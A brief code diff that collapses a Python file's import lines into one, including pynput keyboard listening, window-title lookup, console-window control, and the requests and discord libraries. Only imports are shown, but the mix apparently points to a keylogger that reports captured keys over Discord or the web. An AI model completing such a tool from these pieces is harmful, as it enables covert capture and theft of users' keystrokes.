@@ -1,10 +1,4 @@
-import os
-import requests
-import pygetwindow as gw
-import win32gui
-import win32console
-import json
-import discord
+import os, requests, pygetwindow as gw, win32gui, win32console, json, discord
 from pynput import keyboard
 from pynput.keyboard import Key, KeyCode
 from queue import Queue
